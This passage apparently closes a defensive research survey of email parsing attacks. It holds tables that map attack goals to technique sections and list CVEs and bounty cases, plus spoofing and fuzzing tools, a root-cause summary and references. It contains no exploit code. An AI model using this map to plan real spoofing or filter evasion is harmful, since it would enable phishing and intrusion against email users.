| **Authentication Bypass** | Circumventing SPF/DKIM/DMARC without triggering rejection or warning | §1-1 + §3-1 + §3-2 + §3-3 + §3-4 |
| **Access Control Bypass** | Using email address manipulation to gain access to restricted resources (employee portals, OAuth, SSO) | §2-1 + §2-2 + §2-3 + §2-4 + §2-5 |
| **Malware Delivery** | Evading email security gateway attachment/content scanning | §4-1 + §4-2 + §4-3 + §4-4 + §6-1 |
| **Phishing Amplification** | Sending credible phishing at scale through legitimate infrastructure | §1-4 + §3-2 (DKIM replay) + §3-5 + §5-3 + §7-3 |
| **Data Exfiltration** | Extracting plaintext from encrypted email | §8-1 |
| **Spam Amplification** | Replaying DKIM-signed messages to bypass reputation systems | §3-2 (DKIM replay) + §1-4 |
| **Security Gateway Evasion** | Bypassing email WAFs, anti-phishing, and DLP systems | §4-1 + §4-2 + §4-3 + §4-4 + §6-1 + §6-2 + §7-3 |
| **Webmail Client Compromise** | Achieving XSS or session hijack via rendered email content | §7-1 + §7-2 + §6-1 |
| **Email-to-RCE Chain** | Using email address parsing bugs to achieve code execution on the server | §2-3 + §2-4 (Punycode → CSS injection → CSRF → template edit → RCE) |

---

## CVE / Bounty Mapping (2018–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §1-1 + §1-2 (Bare-LF EOD, Postfix) | CVE-2023-51764 (Postfix) | Email spoofing bypassing SPF/DMARC for millions of Postfix instances |
| §1-1 + §1-2 (Bare-LF EOD, Sendmail) | CVE-2023-51765 (Sendmail) | SMTP smuggling enabling spoofed email delivery |
| §1-1 + §1-2 (Bare-CR EOD, Exim) | CVE-2023-51766 (Exim) | SMTP smuggling via non-standard EOD sequences |
| §1-1 + §1-2 (aiosmtpd) | CVE-2024-27305 (aiosmtpd) | Python SMTP library vulnerable to smuggling attacks |
| §1-3 (CRLF in SMTP commands, libcurl) | HackerOne #3235428 (curl) | CRLF injection in libcurl SMTP client via --mail-from/--mail-rcpt (2025) |
| §1-4 (Shared SPF, multi-tenant) | CVE-2024-7208 | Authenticated sender spoofs shared hosted domain identity, bypassing DMARC |
| §1-4 (Shared SPF, multi-tenant) | CVE-2024-7209 | Shared SPF records in multi-tenant hosting enable cross-tenant spoofing |
| §2-3 + §2-4 (Encoded-word + Punycode → RCE) | Joomla via PortSwigger research (2024) | Malformed Punycode → CSS injection → CSRF → admin template → RCE chain |
| §2-3 (Encoded-@ bypass) | GitHub via PortSwigger research (2024) | Unauthorized domain verification bypass via encoded-word in email address |
| §2-3 (Encoded-space splitting) | GitLab Enterprise (2024) | Email address domain bypass via encoded space in local-part |
| §3-2 (DKIM replay + OAuth) | Google OAuth/DKIM (April 2025) | Phishing emails from `no-reply@accounts.google.com` exploiting OAuth app name as payload |
| §3-5 (Sender field fabrication) | USENIX Security 2024 research | Spoofed delegate identity passes authentication across 16 providers |
| §4-1 + §4-2 (MIME ambiguity evasion) | CCS 2024 — 19 evasion methods | Attachment detector bypass across Gmail, iCloud, Coremail, Tencent |
| §7-1 (Webmail XSS, Roundcube) | CVE-2024-42008, CVE-2024-42009, CVE-2024-42010 | Critical XSS enabling email/contact theft; exploited in espionage campaigns against governments |
| §7-1 (Webmail XSS, MDaemon) | CVE-2024-11182 | Zero-day XSS via malformed HTML in email; credential theft + 2FA bypass |
| §8-1 (EFAIL, S/MIME + OpenPGP) | CVE-2017-17688 (OpenPGP), CVE-2017-17689 (S/MIME) | Plaintext exfiltration from encrypted email via HTML image loading |
| §1-3 (SMTP command injection, Ruby Net::SMTP) | HackerOne #137631 | SMTP command injection via CRLF in Ruby standard library |
| §1-3 (SMTP command injection, Nextcloud) | HackerOne #1509216 | SMTP command injection in Nextcloud mail sending functionality |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **SMTP Smuggling Scanner** (The-Login) | Inbound SMTP servers (§1-1, §1-2) | Sends emails with variant EOD sequences to detect which non-standard terminators are accepted |
| **espoofer** (chenjj) | SPF/DKIM/DMARC bypass (§3-1, §3-2, §3-3) | Implements 18+ spoofing attacks in server, client, and manual modes; generates test cases via ABNF grammar fuzzing |
| **ESpoofing** (mo-xiaoxi) | Email authentication fuzzing (§3-1, §3-2, §3-3) | Fuzzes authentication-related headers based on ABNF grammar to discover novel bypass combinations |
| **MIMEminer** (CCS 2024) | MIME parsing differentials (§4-1, §4-2, §4-3) | Systematically generates MIME messages with ambiguous headers to find scanner-client parsing gaps |
| **Hackvertor** (PortSwigger) | Email address encoding (§2-3, §2-4) | Burp Suite extension for testing encoded-word, Punycode, and Unicode overflow payloads in email addresses |
| **Turbo Intruder** (PortSwigger) | Email address parsing (§2-1–§2-5) | High-speed fuzzing of email address formats against target applications |
| **MailScanner** (open source) | Email content scanning (§4, §6, §7) | Open-source email security scanner for virus, spam, and malware detection |
| **Amavis** (open source) | MIME parsing / AV gateway (§4) | Content filter between MTA and AV/spam scanners; affected by MIME parsing bugs |
| **SMTP Smuggling Diagnostic Service** (USENIX 2025) | Self-assessment for SMTP smuggling (§1-1, §1-2, §1-4) | Online service for email administrators to test their own infrastructure for smuggling vulnerabilities |

---

## Summary: Core Principles

### The Root Cause: Specification Complexity Meets Implementation Divergence

The email ecosystem is governed by a web of overlapping, sometimes contradictory specifications accumulated over four decades (RFC 821 in 1982 through RFC 8617 in 2019). Each specification permits syntactic flexibility — comments in addresses, multiple encoding schemes, optional headers, legacy routing formats — that was designed for interoperability but creates an enormous surface for parser disagreement. The fundamental problem is that **email is processed by a pipeline of independent parsers, each implementing a different subset of these specifications, with no shared canonical form**. When a security-relevant decision (authentication, scanning, routing) is made by one parser and a user-visible action (rendering, delivery) is performed by another, any disagreement between them becomes exploitable.

### Why Incremental Fixes Fail

Each individual vulnerability — a non-standard EOD sequence, an encoded-word bypass, a MIME boundary confusion — can be patched. But the patches are point fixes against a combinatorial mutation space. SMTP smuggling was patched in Postfix, Sendmail, and Exchange, yet 19 public email services and 1,577 private services remained vulnerable to the same or variant techniques as of 2025. Email address parsing was analyzed in depth, yet GitHub, GitLab, Zendesk, and Joomla all fell to different parser differential techniques using the same RFC features. The mutation space regenerates because **the underlying specification complexity is not reduced by patches** — each implementation independently re-encounters the same ambiguities.

### The Structural Solution

A structural defense requires **parser canonicalization at trust boundaries**: before any security decision is made, the email must be re-serialized into a single canonical representation that all downstream components agree on. This means: strict EOD enforcement (reject non-CRLF line endings), email address normalization (strip comments, decode encoded-words, reject quoted local-parts at trust boundaries), MIME structure simplification (resolve ambiguous headers, flatten encoding layers), and authentication binding (tie DKIM to all display-relevant headers, enforce strict DMARC alignment, validate Sender fields). Until the email pipeline enforces a single canonical interpretation at each trust boundary, the parsing differential attack surface will continue to regenerate faster than it can be patched.

---

## References

- SEC Consult, "SMTP Smuggling — Spoofing E-Mails Worldwide," December 2023. https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/
- CERT/CC, "VU#302671: SMTP end-of-data uncertainty can be abused to spoof emails and bypass policies," January 2024. https://kb.cert.org/vuls/id/302671
- Wang et al., "Email Spoofing with SMTP Smuggling: How the Shared Email Infrastructures Magnify this Vulnerability," USENIX Security 2025. https://www.usenix.org/conference/usenixsecurity25/presentation/wang-chuhan
- Chen et al., "Composition Kills: A Case Study of Email Sender Authentication," USENIX Security 2020. https://www.usenix.org/conference/usenixsecurity20/presentation/chen-jianjun
- Ma et al., "FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems," USENIX Security 2024. https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui
- Shen et al., "Weak Links in Authentication Chains: A Large-scale Analysis of Email Sender Spoofing Attacks," USENIX Security 2021. https://www.usenix.org/system/files/sec21summer_shen-kaiwen.pdf
- Heyes, "Splitting the email atom: exploiting parsers to bypass access controls," PortSwigger Research / Black Hat USA 2024. https://portswigger.net/research/splitting-the-email-atom
- Wang et al., "Inbox Invasion: Exploiting MIME Ambiguities to Evade Email Attachment Detectors," ACM CCS 2024. https://dl.acm.org/doi/10.1145/3658644.3670386
- Chand et al., "Doubly Dangerous: Evading Phishing Reporting Systems by Leveraging Email Tracking Techniques," USENIX Security 2025. https://www.usenix.org/conference/usenixsecurity25/presentation/chand
- Poddebniak et al., "Efail: Breaking S/MIME and OpenPGP Email Encryption using Exfiltration Channels," USENIX Security 2018. https://efail.de/
- Noxxi, "Dubious MIME — Conflicting Multipart Boundaries," 2015. https://noxxi.de/research/mime-conflicting-boundary.html
- CERT/CC, "VU#244112: Multiple SMTP services are susceptible to spoofing attacks due to insufficient enforcement," July 2024. https://kb.cert.org/vuls/id/244112
- Revisiting Email Forwarding Security under the Authenticated Received Chain Protocol, WWW 2022. https://gangw.cs.illinois.edu/arc-www22.pdf
- Heyes, "Bypassing character blocklists with unicode overflows," PortSwigger Research. https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- OWASP, "Testing for IMAP SMTP Injection." https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection

---

*This document was created for defensive security research and vulnerability understanding purposes.*
